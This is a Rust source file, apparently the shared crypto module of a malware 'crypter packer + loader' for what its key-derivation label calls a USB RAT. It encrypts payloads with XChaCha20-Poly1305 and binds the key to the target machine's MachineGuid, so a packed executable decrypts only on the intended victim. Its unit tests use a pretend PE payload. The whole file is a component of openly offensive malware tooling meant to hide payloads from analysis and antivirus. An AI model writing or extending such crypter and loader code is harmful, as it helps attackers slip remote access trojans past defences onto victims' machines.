//! Shared crypto for crypter packer + loader: XChaCha20-Poly1305 (AEAD).
//! Tamper/corruption → decrypt returns Err, loader refuses to run.

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    Key, XChaCha20Poly1305, XNonce,
};
use hkdf::Hkdf;
use sha2::Sha256;

pub const KEY_LEN: usize = 32;
pub const NONCE_LEN: usize = 24;

/// Derive a per-machine payload key from a build secret and the target
/// MachineGuid. The same (secret, guid) pair always yields the same key; a
/// different machine produces a different key and decryption fails.
pub fn derive_key(secret: &[u8; KEY_LEN], machine_guid: &str) -> [u8; KEY_LEN] {
    let hk = Hkdf::<Sha256>::new(Some(machine_guid.as_bytes()), secret);
    let mut okm = [0u8; KEY_LEN];
    hk.expand(b"usb-rat-bind-v1", &mut okm)
        .expect("HKDF output length is valid");
    okm
}

pub fn encrypt(plain: &[u8], key: &[u8; KEY_LEN], nonce: &[u8; NONCE_LEN]) -> Vec<u8> {
    let cipher = XChaCha20Poly1305::new(Key::from_slice(key));
    cipher
        .encrypt(XNonce::from_slice(nonce), plain)
        .expect("XChaCha20Poly1305 encrypt is infallible for in-memory buffers")
}

pub fn decrypt(
    blob: &[u8],
    key: &[u8; KEY_LEN],
    nonce: &[u8; NONCE_LEN],
) -> Result<Vec<u8>, String> {
    let cipher = XChaCha20Poly1305::new(Key::from_slice(key));
    cipher
        .decrypt(XNonce::from_slice(nonce), blob)
        .map_err(|_| "decrypt failed (wrong key/nonce or corrupt blob)".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn roundtrip() {
        let key = [7u8; KEY_LEN];
        let nonce = [9u8; NONCE_LEN];
        let msg = b"MZ\x90\x00 pretend PE payload";
        let ct = encrypt(msg, &key, &nonce);
        assert_ne!(ct.as_slice(), msg.as_slice());
        let pt = decrypt(&ct, &key, &nonce).unwrap();
        assert_eq!(pt.as_slice(), msg.as_slice());
    }

    #[test]
    fn wrong_key_fails() {
        let ct = encrypt(b"x", &[1u8; KEY_LEN], &[2u8; NONCE_LEN]);
        assert!(decrypt(&ct, &[3u8; KEY_LEN], &[2u8; NONCE_LEN]).is_err());
    }

    #[test]
    fn derive_key_is_deterministic_and_machine_bound() {
        let secret = [7u8; KEY_LEN];
        let a = derive_key(&secret, "11111111-2222-3333-4444-555555555555");
        let b = derive_key(&secret, "11111111-2222-3333-4444-555555555555");
        let c = derive_key(&secret, "99999999-8888-7777-6666-555555555555");
        assert_eq!(a, b);
        assert_ne!(a, c);
    }

    #[test]
    fn tamper_fails() {
        let key = [4u8; KEY_LEN];
        let nonce = [5u8; NONCE_LEN];
        let mut ct = encrypt(b"hello", &key, &nonce);
        ct[0] ^= 0xFF;
        assert!(decrypt(&ct, &key, &nonce).is_err());
    }
}
